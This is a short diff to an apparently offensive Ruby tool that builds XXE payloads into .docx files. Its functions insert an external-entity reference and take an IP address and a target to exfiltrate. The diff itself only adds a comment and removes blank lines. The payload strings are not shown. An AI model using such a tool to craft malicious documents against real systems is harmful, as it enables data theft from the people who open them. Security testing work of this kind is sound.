@@ -200,6 +200,8 @@ def jpg_poc(hostname)
 	return nm
 end
 
+# Given the xxe payload, the input_file (e.g. output_foo_rand.docx), and what to exfiltrate --
+# 	this will replace §.
 def string_replace(payload,input_file,ip,exfiltrate)
 	targets = []
 
@@ -225,14 +227,10 @@ def string_replace(payload,input_file,ip,exfiltrate)
 	FileUtils::copy_file(input_file,rand_file)
 
 	targets.each do |target|
-
 		document = read_rels(rand_file,"#{target}")
-
 		docx_xml = payload(document,payload,ip,exfiltrate)
-
 		# replace string
 		docx_xml = docx_xml.gsub("§","&xxe;")
-
 		docx_modify(rand_file, docx_xml, target)
 	end
 
